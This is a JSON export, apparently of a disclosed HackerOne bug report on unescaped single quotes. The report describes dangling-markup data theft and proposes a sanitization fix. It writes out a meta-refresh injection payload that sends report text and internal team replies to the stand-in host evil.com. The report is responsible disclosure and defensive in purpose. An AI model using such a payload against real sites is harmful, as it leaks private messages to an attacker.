                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Cool, thanks for the fix!", 
            "markdown_message": "<p>Cool, thanks for the fix!</p>\n", 
            "type": "Activities::Comment", 
            "id": 809532, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "intidc", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/intidc", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/322/3504a32c2b3355c1d38cd99cad7bdf77255466a3_small.jpg?1475194128"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 57, 
        "name": "Violation of Secure Design Principles"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -87769828.6565759, 
    "disclosed_at": "2016-01-26T16:05:58.643Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/110578", 
    "created_at": "2016-01-13T23:59:29.009Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hey,</p>\n\n<p>This is more like an in-depth security thing with a reasonable attack scenario.</p>\n\n<p>In some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:</p>\n\n<ol>\n<li>There&#39;s a HTML injection vulnerability</li>\n<li>The sensitive data is preceded by the HTML injection vulnerability</li>\n<li>After the sensitive data, there&#39;s a single quote (could be inserted by the attacker)</li>\n</ol>\n\n<p>Due to these requirements I haven&#39;t been able to test it, though I did found some places where it theoretically could work.</p>\n\n<p>The problem is that HackerOne does not convert single quotes to their HTML entities (\u2018), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.</p>\n\n<h2 id=\"example\">Example</h2>\n\n<p>Say someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here&#39;s a quick sketch of a report to illustrate this:</p>\n\n<p>[report title]<br>\n&gt; reporter: report body<br>\n &lt; vendor: reply<br>\n &lt; vendor: internal reply<br>\n&gt; reporter: comment (that contains a single quote)</p>\n\n<p>At this point, if the reporter would add the following to the summary (above the report body):</p>\n\n<blockquote>\n<p>&lt;meta http-equiv=&quot;refresh&quot; content=&#39;0; url=<a title=\"https://evil.com/log.php?text=\" href=\"/redirect?signature=b19b2a377cef881e7f2bb62c52cb898fa059cc44&amp;url=https%3A%2F%2Fevil.com%2Flog.php%3Ftext%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://evil.com/log.php?text=</span><i class=\"icon-external-link\"></i></a></p>\n</blockquote>\n\n<p>This will send the following to the server:</p>\n\n<blockquote>\n<p>report body + vendor reply + internal reply</p>\n</blockquote>\n\n<p>Because the unconverted &#39; in the last comment would close the attribute and form a valid HTML element.<br>\nYou could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.</p>\n\n<p>Another vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.</p>\n\n<h2 id=\"the-fix\">The fix</h2>\n\n<p>The behavior described above can easily be prevented.: </p>\n\n<p>I&#39;d just add the conversion to &amp;lsquot  to your sanitization filter. I can&#39;t think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.</p>\n\n<p>Best regards</p>\n\n<p>Inti</p>\n", 
    "vulnerability_information": "Hey,\n\nThis is more like an in-depth security thing with a reasonable attack scenario.\n\nIn some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:\n\n1. There's a HTML injection vulnerability\n2. The sensitive data is preceded by the HTML injection vulnerability\n3. After the sensitive data, there's a single quote (could be inserted by the attacker)\n\nDue to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.\n\nThe problem is that HackerOne does not convert single quotes to their HTML entities (&lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.\n\n## Example\n\nSay someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here's a quick sketch of a report to illustrate this:\n\n[report title]\n\\> reporter: report body\n < vendor: reply\n < vendor: internal reply\n\\> reporter: comment (that contains a single quote)\n\nAt this point, if the reporter would add the following to the summary (above the report body):\n\n> <meta http-equiv=\"refresh\" content='0; url=https://evil.com/log.php?text=\n\nThis will send the following to the server:\n\n>report body + vendor reply + internal reply\n\nBecause the unconverted ' in the last comment would close the attribute and form a valid HTML element.\nYou could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.\n\nAnother vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.\n\n## The fix\n\nThe behavior described above can easily be prevented.: \n\nI'd just add the conversion to &lsquot  to your sanitization filter. I can't think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.\n\n\nBest regards\n\n\nInti", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://hackerone.com", 
            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
            "twitter_handle": "Hacker0x01", 
            "name": "HackerOne"
        }, 
        "handle": "security", 
        "url": "https://hackerone.com/security", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 13, 
        "default_currency": "usd"
    }, 
    "is_published": false
}